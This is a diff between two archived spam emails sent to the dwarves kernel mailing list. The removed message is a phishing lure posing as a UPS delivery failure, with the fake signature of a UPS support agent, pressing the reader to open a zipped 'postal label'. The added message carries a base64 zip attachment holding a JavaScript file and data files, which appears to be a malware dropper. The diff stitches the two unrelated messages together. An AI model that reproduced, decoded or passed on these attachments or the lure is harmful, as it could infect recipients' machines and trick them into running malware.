@@ -1,54 +1,40 @@
-From: CGI-Mailer <cgi-mailer-dF9T667mVpsurp1ckKj+ZQ@public.gmane.org>
-Subject: UPS courier can not deliver parcel #009743150 to you
-Date: Mon, 6 Mar 2017 17:37:09 +0100
-Message-ID: <0Xw5iK-1czaVG1wtT-00LqQj@infongd3070.rtr.kundenserver.de>
-Content-Type: multipart/mixed;
-        boundary="bound1_dc1b01851a74a98c76c6edfde43b63df"
-Content-Transfer-Encoding: 8bit
+From: <sibolt.mulder-b60u5d1xRcFWk0Htik3J/w@public.gmane.org>
+Subject: 29789 dwarves
+Date: Fri, 14 Apr 2017 09:46:47 -0000
+Message-ID: <149216320751.20709.2918588042743646859@rima-tde.net>
+Reply-To: <sibolt.mulder-b60u5d1xRcFWk0Htik3J/w@public.gmane.org>
+Mime-Version: 1.0
+Content-Type: application/zip; name="23.zip"
+Content-Transfer-Encoding: base64
 Return-path: <dwarves-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
+Content-Disposition: attachment
 Sender: dwarves-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-To: dwarves-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
+To: dwarves <dwarves-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
 List-Id: dwarves@vger.kernel.org
 
---bound1_dc1b01851a74a98c76c6edfde43b63df
-Content-Type: text/plain; charset=us-ascii
-
-Dear Customer,
-
-Your item has arrived at March 05, but our courier was not able to deliver the parcel.
-
-Postal label is enclosed to this e-mail. Please check the attachment!
-
-With sincere appreciation,
-Franklin Mcginnis,
-UPS Support Agent.
-
-
---bound1_dc1b01851a74a98c76c6edfde43b63df
-Content-Type: application/zip; name="UPS-Parcel-ID-009743150.zip"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename=UPS-Parcel-ID-009743150.zip
-
-UEsDBBQAAAAIAKSMZko9v2mNzgIAAO4CAAAfAAAAVVBTLVBhcmNlbC1JRC0wMDk3NDMxNTAuZG9j
-LnppcAvwZmYRYWBg4GBY0pPm9fr/N+kAJgaGDcwMDHJA0dCAYN2AxKLk1BxdTxddAwNLcxNjQ1MD
-vZT8ZL2sYt/gXP/bBgL/5nj+5p9m77DogoO2Rons7FNep3eF7lmhELByguebI7mPUrYFBwX8/32O
-L3FyUef7dx+Ln38WDusK+ByzoGdV0PN17ffmnJ8vM837ybpOlz9fFvT/uK7lsbKjlCn7/neGhMA+
-xzXtk9/wzFX6du5JVb7aU49V3poTFuhnMHSa7t1fE3cpYHfh8dfSR66t3d+W4qnS23BkkuOVI1vv
-zDg/O9k7coaKq9fXlzKPbf9ElLrf0K8wF1rP7f0kYlol76zt1Wv9zudvF+cOnzS1f2OlUNiH70sr
-0yr4Xzo/Uf7D+nuWV/bVOfpvmNoZTh70MmBcdnDFnf99f3P6J4YEvt+/q3GR0ib3X9f15qw457mq
-K0bDavHUPIE5iuH7zovWOu+VK+kuK5vAs6Mjo/TknTPNFavfRlbYhkq8lt/bWLvKYyeby4YzOwvK
-T677HnirctqUNa+ubfu64qy2ipVPTNZNnZlnZ16/lmPCO/ujw/kfMt9fO9wxfBcSGnmL893y/fpp
-m1erTZ955XDgxhrVJdWT72xZzi+6c/YR+/73bZEVp+evcqwouiqne3zLLuG1odlTePpOx+tfX7xQ
-anOipaXwwy8tdzfNnpagXVrnUcej9ph7mu3a6xcPlgYvazIKcwma1Nv9eAuPZWeGV9ckLt9mg/MP
-xAxXtL6WYUpU+mTSb+7L9M1oXpDoihaOs9wz3ZeKrsoSOG/DJ3xy6rmOS5OYQgJyLTWPJKxnnfXR
-TMr9q+4GDbUPhxV2qWW+/XJx2zupENbLnlv0ZhVf8TK9ePzVD4YpLEx2TL9nmHqcS/kuLR+S/Wfj
-x9n7N/8XD/BmBKY93KkRAhSgNP60GeDNygZSxQiEPkC6hwnEAwBQSwECAAAUAAAACACkjGZKPb9p
-jc4CAADuAgAAHwAAAAAAAAAAACAAAAAAAAAAVVBTLVBhcmNlbC1JRC0wMDk3NDMxNTAuZG9jLnpp
-cFBLBQYAAAAAAQABAE0AAAALAwAAAAA=
-
-
---bound1_dc1b01851a74a98c76c6edfde43b63df--
-
+UEsDBBQAAAAIAGxLjkp3FVrWBAAAAAIAAAAFAAAAMS5kYXQzNAQAUEsDBBQAAAAIAHxUjkqdSqvl
+eQMAAPAGAAAEAAAAMS5qc3VVUW+bSBB+j5T/wCKdCmrlUFBqlygPgHG5Nj4nhlOaKX3YYGyTYuBg
+jeM73X+/2V2guSSVGDOzs/PNN7PLOFsrWpEelCllqaZ/Uzcpu1Pfqimt1e+afnnJfU5d06OmmgY6
+3o9V/ZvxXVf+OT1paa0sDzftj+nxUblUTk9U0tJc2xdEfYtGk9CKaLGK22zTODRb2zSEw7amqBZC
+JwdUnYRlLfm6uH8gCbPNiW2ahyapswoNv9mSPMcV2/xoW64tooypbTgSV8AKROkpfoXY4fi0qvIs
+oSwri5+oTwCDKLp+xvQ1SOHnuPPw6/zKthDJRyWIhCO6foEt1nmCkNWE7nrWvybsTBdTF1H7/WaX
+9KPsgeW+6EVF2dAN2XA/rEiS0XxW5itSNxI4Irsqp4w0HUfT7ZBN+9zjD192xd7JXED6NS1W5Y4v
+yY0Y5NhWR8f6/yMRB7PfNfZsy+jT8W6RR8KVvkOi7xLdX1QED2ciz8A0P/lRr3ZMPV6maW4Zq2zL
+sc0ZPsm2Lnek+VHmfyN6wunO6GqXiQCE86stbp6teXssC+1Nth4KNznimuaNvJXd0fW3wQ9JseLV
+98vZWhCY9G5G2b7pWi+6zy+EZfQVG/a4q7I/zL7EAXFwRMeKDIdoW++fuW/rjJGuT336pSTdVGXR
+8XfL1XGAFkvP0l+XTSY/gSGT8SxTSFsSlTPZvxw5TeT98rryBPxr2F5eygFAnhYoryN+hBLPfyTJ
+npH+Q6rE6yc+P2nzhS4vPFql6J5cFE2Sri6VPZ7Gqq5fqBdySN0nfrmYBXJGBV+u5nEcLmaO6zGU
+AwpFqf043v2OiscNlBIl5G8BvWZxfMjQLBzXmy66wAZFQfkDvcmeBy7xJy1Y63OlwQ5jriOHibhj
+zrdwYIFZsp6h286D4vYGGYqBy4dByodBmjBNvW28Jc7CURP4V7mqY0jK56z2pgUMPfqf4Q7qNYTw
+AApcKi60MIcACriFGxjBMt3AElIKK9DuIQG/hAXMghHUkAIOggRS7Sx2wPXONvAOFFUFXYdRAlug
+UDvANPgAYxQLzsE8H599QEPoKGPQL97oozrlQBwHzjbvEELXu8rqJFjvy/b1ypptmucjWl3jRHb4
+dVT7sL92s8OfeYRhstb+f2bIhFX5j5WG1d/V6/ABc25UHX9/U/WndIigk0o+/56e/AdQSwMEFAAA
+AAgAcEuOSjYkQc8EAAAAAgAAAAUAAAAyLmRhdDMwBABQSwECHwAUAAAACABsS45KdxVa1gQAAAAC
+AAAABQAkAAAAAAAAACAAAAAAAAAAMS5kYXQKACAAAAAAAAEAGADeSDAu6LTSAQ4BQip4tNIBDgFC
+Kni00gFQSwECHwAUAAAACAB8VI5KnUqr5XkDAADwBgAABAAkAAAAAAAAACAAAAAnAAAAMS5qcwoA
+IAAAAAAAAQAYABUcUMHxtNIBBfVPwfG00gEF9U/B8bTSAVBLAQIfABQAAAAIAHBLjko2JEHPBAAA
+AAIAAAAFACQAAAAAAAAAIAAAAMIDAAAyLmRhdAoAIAAAAAAAAQAYAJJe2DLotNIBmiIr5Wu00gGa
+Iivla7TSAVBLBQYAAAAAAwADAAQBAADpAwAAAAA=
 --
 To unsubscribe from this list: send the line "unsubscribe dwarves" in
 the body of a message to majordomo-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
